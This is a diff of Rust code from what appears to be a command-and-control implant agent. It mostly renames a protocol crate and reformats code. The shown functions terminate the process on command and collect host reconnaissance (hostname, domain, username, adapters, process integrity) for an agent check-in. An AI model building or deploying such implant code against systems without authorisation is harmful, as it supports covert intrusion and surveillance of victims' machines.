@@ -1,25 +1,22 @@
 use core::ffi::c_void;
 
-use libc_print::libc_println;
-use mod_agentcore::{instance, instance_mut};
-use mod_win32::{
-    nt_current_process,
-    nt_get_adapters_info::get_adapters_info,
-    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
-    nt_peb::{
-        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
-        get_username,
-    },
-    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
-    nt_time::current_timestamp,
-};
-use rs2_communication_protocol::{
+use kageshirei_communication_protocol::{
     communication_structs::{
         checkin::{Checkin, PartialCheckin},
         task_output::TaskOutput,
     },
     metadata::Metadata,
     network_interface::NetworkInterface,
+};
+use libc_print::libc_println;
+use mod_agentcore::{instance, instance_mut};
+use mod_win32::{
+    nt_current_process,
+    nt_get_adapters_info::get_adapters_info,
+    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
+    nt_peb::{get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
+    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
+    nt_time::current_timestamp,
 };
 
 use crate::setup::system_data::checkin_from_raw;
@@ -36,8 +33,8 @@ use crate::setup::system_data::checkin_from_raw;
 /// - Calls `NtTerminateProcess` from the Windows NT API.
 ///
 /// # Safety
-/// - This function interacts with low-level NT APIs and terminates the process, which may lead
-///   to data loss or corruption if used improperly.
+/// - This function interacts with low-level NT APIs and terminates the process, which may lead to data loss or
+///   corruption if used improperly.
 pub fn command_exit(exit_type: i32) -> TaskOutput {
     // Example of an asynchronous operation before termination
     if exit_type == 1 {
@@ -58,15 +55,19 @@ pub fn command_exit(exit_type: i32) -> TaskOutput {
 
 /// Gathers system and process metadata, creates a `Checkin` object, and serializes it to JSON format.
 ///
-/// This function retrieves various system information and process details, performing actions equivalent to several Windows APIs.
+/// This function retrieves various system information and process details, performing actions equivalent to several
+/// Windows APIs.
 ///
 /// # Functions involved
-/// - `get_computer_name_ex`: Retrieves the DNS hostname of the computer. Replicates the functionality of the `GetComputerNameExW` Windows API.
+/// - `get_computer_name_ex`: Retrieves the DNS hostname of the computer. Replicates the functionality of the
+///   `GetComputerNameExW` Windows API.
 /// - `get_os`: Retrieves the operating system information from the Process Environment Block (PEB).
 /// - `get_os_version_info`: Fetches detailed OS version information. Replicates the functionality of `RtlGetVersion`.
-/// - `get_adapters_info`: Retrieves information about the network adapters, including IP addresses. Replicates the functionality of `GetAdaptersInfo`.
+/// - `get_adapters_info`: Retrieves information about the network adapters, including IP addresses. Replicates the
+///   functionality of `GetAdaptersInfo`.
 /// - `get_pid_and_ppid`: Retrieves the current process ID (PID) and the parent process ID (PPID).
-/// - `get_process_integrity`: Determines the integrity level of the current process. Replicates the functionality of `GetTokenInformation` with `TokenIntegrityLevel`.
+/// - `get_process_integrity`: Determines the integrity level of the current process. Replicates the functionality of
+///   `GetTokenInformation` with `TokenIntegrityLevel`.
 /// - `get_user_domain`: Retrieves the user's domain name.
 /// - `get_username`: Retrieves the username of the current user. Replicates the functionality of `GetUserNameW`.
 /// - `get_process_name`: Retrieves the name of the current process.
@@ -74,7 +75,8 @@ pub fn command_exit(exit_type: i32) -> TaskOutput {
 ///
 /// # Returns
 /// - `TaskOutput`: A structure containing the result of the check-in operation. It includes:
-///   - `output`: The output of the executed command as a serialized JSON `String` that represents the gathered system information (e.g., hostname, OS version, network adapters, etc.).
+///   - `output`: The output of the executed command as a serialized JSON `String` that represents the gathered system
+///     information (e.g., hostname, OS version, network adapters, etc.).
 ///   - `exit_code`: An `Option<u8>` where `Some(0)` indicates success, and non-zero values indicate failure.
 ///   - `started_at`: A timestamp indicating when the operation started.
 ///   - `ended_at`: A timestamp indicating when the operation ended.
@@ -105,7 +107,8 @@ pub fn command_checkin(metadata: Metadata) -> TaskOutput {
         hostname = String::from_utf16_lossy(&buffer)
             .trim_end_matches('\0') // Remove any trailing null characters.
             .to_string();
-    } else {
+    }
+    else {
         // Log an error if retrieving the computer name fails.
         libc_println!("[!] get_computer_name_ex failed");
     }
@@ -142,16 +145,16 @@ pub fn command_checkin(metadata: Metadata) -> TaskOutput {
     // Create a `Checkin` object with the gathered metadata.
     let mut checkin = unsafe {
         Box::new(Checkin::new(PartialCheckin {
-            operative_system: operating_system,     // OS details.
-            hostname: hostname,                     // Computer hostname.
-            domain: get_user_domain(),              // User's domain name.
-            username: get_username(),               // User's username.
-            network_interfaces: network_interfaces, // Network adapter IP addresses.
-            process_id: pid as i64,                 // Process ID.
-            parent_process_id: ppid as i64,         // Parent Process ID.
-            process_name: get_process_name(),       // Name of the current process.
-            integrity_level: rid,                   // Process integrity level.
-            cwd: get_image_path_name(),             // Current working directory.
+            operative_system: operating_system, // OS details.
+            hostname,                           // Computer hostname.
+            domain: get_user_domain(),          // User's domain name.
+            username: get_username(),           // User's username.
+            network_interfaces,                 // Network adapter IP addresses.
+            process_id: pid as i64,             // Process ID.
+            parent_process_id: ppid as i64,     // Parent Process ID.
+            process_name: get_process_name(),   // Name of the current process.
+            integrity_level: rid,               // Process integrity level.
+            cwd: get_image_path_name(),         // Current working directory.
         }))
     };
 
@@ -185,8 +188,8 @@ mod tests {
         let metadata = Metadata {
             request_id: format!("req-{}", 1),
             command_id: format!("cmd-{}", 1),
-            agent_id: "agent-1234".to_string(),
-            path: None,
+            agent_id:   "agent-1234".to_string(),
+            path:       None,
         };
 
         // Test gathering system information and metadata for check-in
